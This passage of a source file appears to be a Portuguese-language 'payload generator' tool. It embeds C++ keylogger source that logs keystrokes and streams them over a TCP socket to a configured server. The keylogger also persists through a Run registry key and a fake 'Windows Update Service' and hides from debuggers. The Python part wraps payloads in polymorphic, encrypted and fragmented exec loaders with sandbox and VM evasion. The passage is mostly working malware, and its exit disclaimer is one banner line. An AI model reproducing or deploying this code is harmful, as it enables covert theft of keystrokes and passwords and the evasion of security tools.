    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (const char* proc : blacklist) {
                if (_stricmp(pe32.szExeFile, proc) == 0) {
                    ExitProcess(1);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
}

// Funções de rede
bool init_network() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    serverAddr.sin_port = htons(SERVER_PORT);
    
    if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        sock = INVALID_SOCKET;
        return false;
    }
    
    return true;
}

void send_to_server(const std::string& data) {
    if (sock == INVALID_SOCKET) return;
    send(sock, data.c_str(), data.length(), 0);
}

// Funções de persistência
void add_persistence() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    
    RegOpenKeyEx(HKEY_CURRENT_USER, 
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(hKey);
    
    // Técnica adicional - Serviço
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scm) {
        SC_HANDLE svc = CreateService(
            scm, "WinUpdateSvc", "Windows Update Service",
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
            path, NULL, NULL, NULL, NULL, NULL
        );
        
        if (svc) {
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
}

// Função principal do keylogger
void keylogger() {
    std::ofstream logfile(LOG_FILE, std::ios::binary | std::ios::app);
    
    time_t now = time(0);
    logfile << "\\n[Keylogger Started - " << ctime(&now) << "]\\n";
    
    // Inicializa rede se possível
    init_network();
    
    while (running) {
        // Verificação anti-debug periódica
        if (GetTickCount() % 60000 == 0) {
            anti_debug_checks();
        }
        
        // Captura de teclas
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                // Processa a tecla pressionada
                process_key(i, logfile);
            }
        }
        
        Sleep(10);
    }
    
    // Limpeza
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
        WSACleanup();
    }
    logfile.close();
}

// Processamento de teclas
void process_key(int key, std::ofstream& logfile) {
    char buffer[128] = {0};
    
    switch (key) {
        case VK_SHIFT: strcpy(buffer, "[SHIFT]"); break;
        case VK_RSHIFT: strcpy(buffer, "[RSHIFT]"); break;
        case VK_LSHIFT: strcpy(buffer, "[LSHIFT]"); break;
        case VK_RETURN: strcpy(buffer, "\\n[ENTER]\\n"); break;
        case VK_BACK: strcpy(buffer, "[BACKSPACE]"); break;
        case VK_TAB: strcpy(buffer, "[TAB]"); break;
        case VK_CONTROL: strcpy(buffer, "[CTRL]"); break;
        case VK_MENU: strcpy(buffer, "[ALT]"); break;
        case VK_CAPITAL: strcpy(buffer, "[CAPSLOCK]"); break;
        case VK_ESCAPE: strcpy(buffer, "[ESC]"); break;
        case VK_SPACE: strcpy(buffer, " "); break;
        case VK_LEFT: strcpy(buffer, "[LEFT]"); break;
        case VK_RIGHT: strcpy(buffer, "[RIGHT]"); break;
        case VK_UP: strcpy(buffer, "[UP]"); break;
        case VK_DOWN: strcpy(buffer, "[DOWN]"); break;
        case VK_DELETE: strcpy(buffer, "[DEL]"); break;
        case VK_LWIN: case VK_RWIN: strcpy(buffer, "[WIN]"); break;
        case VK_NUMPAD0: strcpy(buffer, "0"); break;
        case VK_NUMPAD1: strcpy(buffer, "1"); break;
        // ... outros casos especiais
        
        default:
            // Teclas alfanuméricas
            if ((key >= 65 && key <= 90) || (key >= 48 && key <= 57)) {
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                
                if ((shift && !caps) || (!shift && caps)) {
                    buffer[0] = (char)key;
                } else {
                    buffer[0] = (char)(key + 32);
                }
                buffer[1] = '\\0';
            }
    }
    
    // Log local e remoto
    if (strlen(buffer) > 0) {
        logfile << buffer;
        logfile.flush();
        
        if (sock != INVALID_SOCKET) {
            send_to_server(buffer);
        }
    }
}

// Ponto de entrada
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Verifica se já está em execução
    hMutex = CreateMutex(NULL, TRUE, "Global\\WinUpdateKeylogger");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    // Anti-debugging
    anti_debug_checks();
    
    // Ocultar console
    HWND stealth = GetConsoleWindow();
    if (stealth) {
        ShowWindow(stealth, SW_HIDE);
    }
    
    // Persistência
    add_persistence();
    
    // Iniciar keylogger em thread separada
    std::thread logger_thread(keylogger);
    logger_thread.detach();
    
    // Loop de mensagens para manter o programa ativo
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    running = false;
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    return 0;
}"""
    
    # ==============================================
    # TÉCNICAS DE OFUSCAÇÃO AVANÇADAS
    # ==============================================
    
    def _ofuscar_avancado(self, payload: str, tecnica: str) -> str:
        """Aplica técnicas avançadas de ofuscação"""
        if tecnica == 'polimorfico':
            return self._ofuscar_polimorfico(payload)
        elif tecnica == 'metamorfico':
            return self._ofuscar_metamorfico(payload)
        elif tecnica == 'criptografar_aes':
            return self._ofuscar_com_criptografia(payload)
        elif tecnica == 'fragmentado':
            return self._ofuscar_fragmentado(payload)
        elif tecnica == 'anti_analise':
            return self._adicionar_anti_analise(payload)
        else:
            return payload
    
    def _ofuscar_polimorfico(self, payload: str) -> str:
        """Ofuscação polimórfica - código mutável"""
        # Gera nomes aleatórios para variáveis e funções
        vars_random = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,10))) for _ in range(7)]
        
        # Gera código lixo aleatório
        codigo_lixo = [
            f"for {vars_random[0]} in range({random.randint(1,10)}): {vars_random[1]} = {random.randint(1000,9999)}",
            f"{vars_random[2]} = lambda {vars_random[3]}: {vars_random[3]}**{random.randint(2,5)}",
            f"print(''.join(chr({random.randint(65,90)}) for _ in range({random.randint(3,8)})))",
            f"{vars_random[4]} = [{random.randint(1,100)} for _ in range({random.randint(5,20)})]",
            f"{vars_random[5]} = '{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,15)))}'"
        ]
        random.shuffle(codigo_lixo)
        
        # Compressão múltipla com codificação diferente
        compressed = zlib.compress(payload.encode('utf-8'))
        b64_encoded = base64.b64encode(compressed)
        b85_encoded = base64.b85encode(b64_encoded)
        
        return f"""# Variante polimórfica {random.randint(1,10000)}
import base64,zlib
{'; '.join(codigo_lixo)}
{vars_random[6]} = {b85_encoded}
exec(zlib.decompress(base64.b64decode(base64.b85decode({vars_random[6]}))))"""
    
    def _ofuscar_metamorfico(self, payload: str) -> str:
        """Ofuscação metamórfica - reescreve completamente o código"""
        # Dicionário de substituições
        substitutos = {
            'import': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
            'exec': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
            'base64': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12)),
            'zlib': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)),
            'os': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)),
            'sys': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4)),
            'from': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=7)),
            'def': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=9)),
            'class': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=11))
        }
        
        # Substitui todas as ocorrências
        codigo_transformado = payload
        for original, substituto in substitutos.items():
            codigo_transformado = codigo_transformado.replace(original, substituto)
        
        # Adiciona funções e classes aleatórias
        funcoes_lixo = f"""
class {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=12))}:
    def __init__(self):
        self.value = {random.randint(100,999)}
    
    def {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}(self, x):
        return x * {random.randint(2,5)}

def {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=9))}(y):
    return [y**i for i in range({random.randint(3,7)})]
"""
        return f"""# Código metamórfico {random.randint(1,1000)}
{substitutos['import']} {substitutos['os']}
{substitutos['import']} {substitutos['sys']}
{substitutos['import']} {substitutos['base64']}
{substitutos['import']} {substitutos['zlib']}
{funcoes_lixo}
{codigo_transformado}"""
    
    def _ofuscar_com_criptografia(self, payload: str) -> str:
        """Ofuscação usando criptografia AES + XOR"""
        # Gera chaves aleatórias
        chave_aes = Fernet.generate_key()
        chave_xor = os.urandom(32)
        
        # Criptografa com AES
        cifra_aes = Fernet(chave_aes)
        payload_cifrado = cifra_aes.encrypt(payload.encode('utf-8'))
        
        # Aplica XOR adicional
        payload_xor = bytes([payload_cifrado[i] ^ chave_xor[i % len(chave_xor)] for i in range(len(payload_cifrado)))
        
        return f"""# Payload criptografado com AES+XOR
from cryptography.fernet import Fernet
import base64

# Chaves de criptografia
chave_aes = {chave_aes}
chave_xor = {chave_xor}

# Payload criptografado
payload_xor = {payload_xor}

# Aplicar XOR reverso
payload_cifrado = bytes([payload_xor[i] ^ chave_xor[i % len(chave_xor)] for i in range(len(payload_xor))])

# Decifrar AES
cifra = Fernet(chave_aes)
payload = cifra.decrypt(payload_cifrado).decode('utf-8')
exec(payload)"""
    
    def _ofuscar_fragmentado(self, payload: str) -> str:
        """Divide o payload em fragmentos que são reconstruídos em tempo de execução"""
        # Divide o payload em partes
        partes = [payload[i:i+len(payload)//5] for i in range(0, len(payload), len(payload)//5)]
        if len(partes) > 5:
            partes = partes[:5]
        
        # Gera código para reconstrução
        codigo_reconstrucao = "payload = ''\n"
        for i, parte in enumerate(partes):
            nome_var = f"parte_{i}"
            codigo_reconstrucao += f"{nome_var} = {parte!r}\n"
            codigo_reconstrucao += f"payload += {nome_var}\n"
        
        return f"""# Payload fragmentado
{codigo_reconstrucao}
exec(payload)"""
    
    def _adicionar_anti_analise(self, payload: str) -> str:
        """Adiciona técnicas anti-análise ao payload"""
        anti_analise_code = """
# ==============================================
# TÉCNICAS ANTI-ANÁLISE
# ==============================================

def _verificar_debug():
    # Verifica se está rodando em debugger
    try:
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            os._exit(1)
    except:
        pass

def _verificar_sandbox():
    # Verifica ambientes de sandbox/VMs
    try:
        # Verifica processos suspeitos
        processos_suspeitos = [
            'wireshark', 'procmon', 'fiddler', 'httpdebugger',
            'vmware', 'vbox', 'qemu', 'xenservice'
        ]
        
        if platform.system() == 'Windows':
            import wmi
            c = wmi.WMI()
            for processo in c.Win32_Process():
                if any(suspeito in processo.Name.lower() for suspeito in processos_suspeitos):
                    os._exit(1)
        else:
            for proc in os.listdir('/proc'):
                if proc.isdigit():
                    try:
                        with open(f'/proc/{proc}/cmdline', 'r') as f:
                            cmdline = f.read().lower()
                            if any(suspeito in cmdline for suspeito in processos_suspeitos):
                                os._exit(1)
                    except:
                        continue
        
        # Verifica arquivos típicos de VMs
        arquivos_vm = [
            '/sys/class/dmi/id/product_name',
            '/sys/class/dmi/id/sys_vendor',
            '/proc/scsi/scsi'
        ]
        
        for arquivo in arquivos_vm:
            try:
                with open(arquivo, 'r') as f:
                    conteudo = f.read().lower()
                    if 'vmware' in conteudo or 'virtualbox' in conteudo or 'qemu' in conteudo:
                        os._exit(1)
            except:
                pass
        
        # Verifica hardware suspeito
        if platform.system() == 'Linux':
            cpuinfo = ''
            try:
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read().lower()
            except:
                pass
            
            if 'hypervisor' in cpuinfo or 'vmx' in cpuinfo or 'svm' in cpuinfo:
                os._exit(1)
        
    except:
        pass

def _verificar_tempo_execucao():
    # Verifica se o código está sendo executado muito rápido (sandbox)
    try:
        inicio = time.time()
        # Operação que deve levar um tempo mínimo
        sum(x*x for x in range(1000000))
        fim = time.time()
        
        if fim - inicio < 0.1:  # Menos de 100ms é suspeito
            os._exit(1)
    except:
        pass

def _verificar_ambiente():
    # Verifica se está em ambiente real
    try:
        # Verifica se há interação com usuário
        if platform.system() == 'Windows':
            import ctypes
            last_input = ctypes.wintypes.DWORD()
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input))
            idle_time = (ctypes.windll.kernel32.GetTickCount() - last_input.value) / 1000.0
            
            if idle_time > 300:  # 5 minutos sem interação
                os._exit(1)
        else:
            # Verifica X11 ou Wayland no Linux
            if not os.getenv('DISPLAY') and not os.getenv('WAYLAND_DISPLAY'):
                os._exit(1)
    except:
        pass

def _iniciar_protecoes():
    # Executa verificações em thread separada
    import threading
    def _monitorar():
        while True:
            _verificar_debug()
            _verificar_sandbox()
            _verificar_ambiente()
            time.sleep(30)
    
    t = threading.Thread(target=_monitorar, daemon=True)
    t.start()

# Inicia proteções
_iniciar_protecoes()
# Verificação inicial
_verificar_tempo_execucao()
"""
        return anti_analise_code + payload

    # ==============================================
    # FUNÇÕES AUXILIARES
    # ==============================================
    
    def _mostrar_menu_configuracao(self):
        """Mostra o menu de configurações"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ CONFIGURAÇÕES[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False)
            tabela.add_row("1", "Verificar dependências")
            tabela.add_row("2", "Testar técnicas de ofuscação")
            tabela.add_row("3", "Modo de operação")
            tabela.add_row("0", "Voltar")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3"],
                show_choices=False
            )
            
            if escolha == "1":
                self._verificar_dependencias()
            elif escolha == "2":
                self._testar_ofuscacao()
            elif escolha == "3":
                self._alterar_modo_operacao()
            elif escolha == "0":
                return
    
    def _testar_ofuscacao(self):
        """Permite testar técnicas de ofuscação em código de exemplo"""
        console.clear()
        codigo_teste = "print('Hello World')"
        
        console.print(Panel.fit(
            "[bold]TESTE DE OFUSCAÇÃO[/bold]",
            border_style="yellow"
        ))
        console.print("\nCódigo original:")
        console.print(Syntax(codigo_teste, "python"))
        
        tabela = Table(title="Técnicas Disponíveis", show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("Técnica")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[yellow]?[/yellow] Selecione uma técnica para testar",
            choices=[str(i) for i in range(1, len(self.tecnicas_ofuscacao)+1)],
            show_choices=False
        )
        
        tecnica = list(self.tecnicas_ofuscacao.keys())[int(escolha)-1]
        codigo_ofuscado = self._ofuscar_avancado(codigo_teste, tecnica)
        
        console.print("\nResultado da ofuscação:")
        console.print(Syntax(codigo_ofuscado, "python"))
        
        input("\nPressione Enter para continuar...")
    
    def _alterar_modo_operacao(self):
        """Altera entre modos de operação (normal/avançado)"""
        console.print(Panel.fit(
            "[bold red]⚠️ RECURSOS AVANÇADOS ⚠️[/bold red]\n"
            "O modo avançado habilita técnicas experimentais que podem\n"
            "causar instabilidade ou aumentar a detecção por antivírus.",
            border_style="red"
        ))
        
        if self._confirmar("Ativar modo avançado?", 'high'):
            # Adiciona técnicas adicionais
            self.tecnicas_ofuscacao.update({
                'obfuscar_extremo': 'Ofuscação extrema (lento)',
                'encadeamento': 'Encadeamento de criptografia (AES+RSA+XOR)',
                'auto_destruicao': 'Mecanismo de auto-destruição'
            })
            console.print("[green]✓ Modo avançado ativado![/green]")
        else:
            # Remove técnicas avançadas se existirem
            self.tecnicas_ofuscacao.pop('obfuscar_extremo', None)
            self.tecnicas_ofuscacao.pop('encadeamento', None)
            self.tecnicas_ofuscacao.pop('auto_destruicao', None)
            console.print("[yellow]Modo normal ativado.[/yellow]")
        
        time.sleep(1)
    
    def _sair(self):
        """Exibe mensagem de saída estilizada"""
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL DESTA FERRAMENTA É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Obrigado por usar o Gerador de Payloads Elite[/cyan]")
        time.sleep(2)
        sys.exit(0)

def main():
    try:
        gerador = GeradorPayloadsElite()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Operação cancelada pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro crítico: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
